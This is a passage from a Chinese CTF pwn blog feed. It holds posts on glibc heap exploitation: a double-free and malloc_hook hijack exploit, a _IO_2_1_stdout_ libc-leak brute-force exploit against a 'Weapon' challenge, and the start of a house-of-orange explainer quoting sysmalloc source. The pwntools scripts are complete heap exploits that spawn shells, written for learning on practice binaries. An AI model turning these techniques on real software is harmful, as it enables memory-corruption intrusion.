id="没有-show-函数">没有 show 函数</span></h3><h2><span id="思路和exp">思路和exp</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,29502)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line">rwx = <span class="number">0x32b3060000</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">mmap = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;mmap: &quot;</span> + <span class="built_in">hex</span>(mmap))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1 .</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)<span class="comment">#unsortedbin</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x490</span>))</span><br><span class="line">dele(<span class="number">2</span>)<span class="comment">#overlap</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2  2alloc == 1alloc</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)<span class="comment">#为了之后能add到mmap</span></span><br><span class="line">dele(<span class="number">1</span>)<span class="comment">#uaf  此时构成了一个循环 1-&gt;2-&gt;1</span></span><br><span class="line">dele(<span class="number">2</span>)<span class="comment">#uaf</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>,p64(mmap))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2 2alloc == 1alloc</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3 mmap</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">edit(<span class="number">3</span>,shellcode+<span class="string">&#x27;\n&#x27;</span>)<span class="comment"># shellcode写入mmap</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#再触发一次 unsortedbin double free 劫持 malloc_hook</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#4</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x490</span>))</span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#1free==2allc</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#0 切割unsortedbin 使 malloc_hook 链入</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x30\n&#x27;</span>)<span class="comment">#edit to malloc hook</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4 malloc_hook</span></span><br><span class="line">edit(<span class="number">4</span>,p64(mmap))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE利用之_IO_2_1_stdout泄露libc</title>
      <link href="/2021/11/08/IO-FILE%E5%88%A9%E7%94%A8%E4%B9%8B-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/"/>
      <url>/2021/11/08/IO-FILE%E5%88%A9%E7%94%A8%E4%B9%8B-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/</url>
      
        <content type="html"><![CDATA[<p>当俺们进行文件操作时，Linux内核会创建一些结构体来描述这些文件，当我们对结构体操作时就相当于对文件操作。</p><h2><span id="file结构">FILE结构</span></h2><p>FILE 在 linux 系统的标准IO库使用来描述文件结构，称之为文件流。</p><p>“流”是一种抽象概念，只是人们为了便于描述数据的流向而创造的名称。</p><p>比如说当我们要输出磁盘中记录的数据，那么在计算机中首先会将磁盘中的数据加载进内存，那么磁盘–&gt;内存这种流向就被抽象叫做”流”。</p><p>进程中的FILE结构会通过 <code>_chain</code>域彼此连接形成一个链表，链表头部用全局变量<code>_IO_list_all</code>表示，通过这个值可以遍历所有的FILE结构，大致的链表结构如下图：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636379023678569/e99e2835af561bb871032af6afda6efda4432203.png" alt="1"></p><p>每个程序启动时有三个文件流是自动打开的：<code>stdin</code>、<code>stdout</code>、<code>stderr</code>。</p><p>因为会自动打开，所以在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于的是<code>libc.so的数据段</code>。</p><p>具体原理可以参考下方博客</p><hr><p><strong>简言之</strong></p><p>想办法写入 IO_2_1_stdout（一般是利用 unsortedbin ）,让_flags = 0xFBAD1800，然后让后面的三个read参数为0,让write_base为’\x00’</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636379033640211/a6bd4ce51324e89fd2e180640ffc6adad598217b.png" alt="2"></p><h2><span id="例题">例题</span></h2><h3><span id="保护机制">保护机制</span></h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636601759750578/1109fea1501c4407903c3f2e7343a846818219ce.png" alt="image-20211111113559572"></p><p>保护全开，不能改函数 got 表</p><h3><span id="add">add</span></h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636602084888576/4f90e91b8b2b761056fe004e1a1dd68d7c58a0e5.png" alt="image-20211111114124706"></p><p>逻辑是输入申请大小，再输入 index ，然后就写入 chunk，但是大小不能超过 0x60</p><p>没有任何检查，比如申请过的 index 不能用之类的</p><h3><span id="free">free</span></h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636602307580095/1464045816e239d160bd9368ba9f18cac520924d.png" alt="image-20211111114507443"></p><p>uaf 漏洞</p><h3><span id="edit">edit</span></h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/_IO_2_1_stdout/1636602391221854/31a810436390a4653f738fa9bef12833ee8b9905.png" alt="image-20211111114631037"></p><p>没有检查该 idx 是否已被 free</p><p>不能用 unsorted bin 来泄露地址了，于是想到用 __IO_2_1_stdout 来泄露信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&quot;./Weapon&quot;)</span></span><br><span class="line"><span class="comment">#sh = remote(&quot;node3.buuoj.cn&quot;,&quot;25197&quot;)</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x45261</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>():</span></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,index,name</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; \n&quot;</span>,<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;wlecome input your size of weapon: &quot;</span>,<span class="built_in">str</span>(size)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input index: &quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input your name:\n&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createX</span>(<span class="params">size,index,name</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>,<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;wlecome input your size of weapon: &quot;</span>,<span class="built_in">str</span>(size)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input index: &quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input your name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; \n&quot;</span>,<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input idx :&quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteX</span>(<span class="params">index</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>,<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input idx :&quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">index,content</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; \n&quot;</span>,<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input idx: &quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;new content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">renameX</span>(<span class="params">index,content</span>):</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>,<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;input idx: &quot;</span>,<span class="built_in">str</span>(index)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;new content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baopo</span>():</span></span><br><span class="line">create(<span class="number">32</span>,<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">create(<span class="number">16</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">create(<span class="number">16</span>,<span class="number">2</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">create(<span class="number">16</span>,<span class="number">3</span>,p64(<span class="number">0x70</span>)+p64(<span class="number">0x51</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">rename(<span class="number">2</span>,<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">16</span>,<span class="number">4</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">16</span>) <span class="comment">#2 out of bins</span></span><br><span class="line">create(<span class="number">16</span>,<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">48</span>,<span class="number">6</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#6和7是凑数的，为了释放0x100的时候，下一个堆块得写入presize</span></span><br><span class="line">create(<span class="number">48</span>,<span class="number">7</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">16</span>,<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#防止fake chunk与top合并</span></span><br><span class="line"></span><br><span class="line">rename(<span class="number">0</span>,p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">rename(<span class="number">0</span>,p64(<span class="number">0x0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line"></span><br><span class="line">rename(<span class="number">0</span>,p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">rename(<span class="number">5</span>,<span class="string">&#x27;\xdd&#x27;</span>+<span class="string">&#x27;\x65&#x27;</span>)</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line">create(<span class="number">96</span>,<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">96</span>,<span class="number">9</span>,<span class="string">&#x27;\x00&#x27;</span>)  <span class="comment">#IO_2_1_stdout 此处爆破</span></span><br><span class="line"></span><br><span class="line">g()</span><br><span class="line"></span><br><span class="line">x = <span class="string">&#x27;\x00&#x27;</span> * (<span class="number">0x620</span>-<span class="number">0x5dd</span>-<span class="number">0x10</span>) + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span> <span class="comment">#IO_write_base改小</span></span><br><span class="line">rename(<span class="number">9</span>,x) </span><br><span class="line"></span><br><span class="line">g()</span><br><span class="line">sh.recvuntil(p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">sh.recv(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">131</span> -<span class="number">0x3c5620</span></span><br><span class="line"><span class="comment">#  &lt;_IO_2_1_stdout_+131&gt;</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line"></span><br><span class="line">createX(<span class="number">96</span>,<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#改完io之后puts完没有换行。。。</span></span><br><span class="line"></span><br><span class="line">deleteX(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">renameX(<span class="number">5</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line">createX(<span class="number">96</span>,<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">createX(<span class="number">96</span>,<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span> + p64(one_gadget[<span class="number">3</span>] + libc_base))</span><br><span class="line"><span class="comment">#g() </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(__name__ == <span class="string">&#x27;__main__&#x27;</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sh  = process(<span class="string">&#x27;./Weapon&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;node3.buuoj.cn&quot;,&quot;27532&quot;)</span></span><br><span class="line">baopo()</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line">sh.close()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sh = process(&quot;./Weapon&quot;)</span></span><br><span class="line"><span class="string">baopo()</span></span><br><span class="line"><span class="string">sh.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>参考博客</p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113845320?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_41202237/article/details/113845320?spm=1001.2014.3001.5501</a></p><p><a href="https://blog.csdn.net/BengDouLove/article/details/106390373">https://blog.csdn.net/BengDouLove/article/details/106390373</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之house of orange</title>
      <link href="/2021/11/03/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-orange/"/>
      <url>/2021/11/03/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-orange/</url>
      
        <content type="html"><![CDATA[<p><em>头秃，看了好几天，感觉还是没有讲清楚，tcl，等以后有更好的理解时再来改改</em></p><p> <strong>利用情景：没有 free 函数</strong></p><p>不能释放堆空间，就很难泄露出我们想要的地址，但是 house of orange 可以解决此类问题，house of orange 由 地址泄露 + FSOP 两部分组成。</p><h2><span id="地址泄露">地址泄露</span></h2><p>当我们申请一块内存时，malloc 函数会检查各种 bin 是否满足，都不满足条件之后会检查 top chunk ，如果此时 top chunk 也不能满足，就会调用 sysmalloc 来申请内存。</p><p>sysmalloc 会有两种处理方式，一种是直接 mmap 一块内存，另一种是拓展 top chunk（brk）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If have mmap, and the request size meets the mmap threshold, and</span></span><br><span class="line"><span class="comment">   the system supports mmap, and there are few enough currently</span></span><br><span class="line"><span class="comment">   allocated mmapped regions, try to directly map this request</span></span><br><span class="line"><span class="comment">   rather than expanding top.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold) &amp;&amp;</span><br><span class="line">    (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line">  try_mmap:</span><br></pre></td></tr></table></figure><p>这一段代码的意思是，如果申请大小 <code>&gt;= (unsigned long) (mp_.mmap_threshold)</code> ，就会调用 mmap ，而一般 <code>mmap_threshold</code> 大小为 128*1024（0x20000），我们申请的大小小于它就行。</p><p>接着会有两个 assert  函数检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);</span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"> </span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; pagemask) == <span class="number">0</span>));</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure><p>要求修改的 <code>top_chunk_size</code> 必须满足</p><ol><li><code>top_chunk_size</code> &gt; MINSIZE（0x10）</li><li>top chunk inuse 位为1</li><li>修改之后的 size 必须要对齐到内存页（0x1000字节）</li><li><code>top_chunk_size</code>小于申请分配的内存即可</li></ol><p><em>举个例子，假设 top chunk 的地址位于 0x6030d0 并且他的大小为 0x20f31 ，我们就应该重写他的大小为 0xf31 来绕过那些assert，并再次申请 0x1000 大小的 chunk。</em></p><p>满足上述四个条件后，继续执行就会触发 <code>_int_free</code> 把原来的 top chunk 给 free 掉，并放入 unsorted bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">top (av) = chunk_at_offset (heap, <span class="keyword">sizeof</span> (*heap));</span><br><span class="line">set_head (top (av), (heap-&gt;size - <span class="keyword">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Setup fencepost and free the old top chunk with a multiple of</span></span><br><span class="line"><span class="comment">  MALLOC_ALIGNMENT in size. */</span></span><br><span class="line"><span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">  become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">  up, too, although the chunk is marked in use. */</span></span><br><span class="line">old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">set_head (chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line"><span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line"> &#123;</span><br><span class="line">   set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">   set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">   set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">   _int_free (av, old_top, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>此时我们已经得到了一个 unsorted bin ，当我们再次申请 unsorted bin 范围内的堆时，就会在 unsorted bin 中切割，同时也能泄露 libc 地址了。</p><p>需要注意的是，当我们再次分配堆的大小是 <code>large_chunk</code>（大于512字节） ，old_chunk 的堆地址会被放进堆中，也就是说我们既可以泄露 libc ，又能泄露出堆地址。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1635925124172582/6adb814eb3c1d230572acca3dc5d62e692e694f3.png" alt="1"></p><h2><span 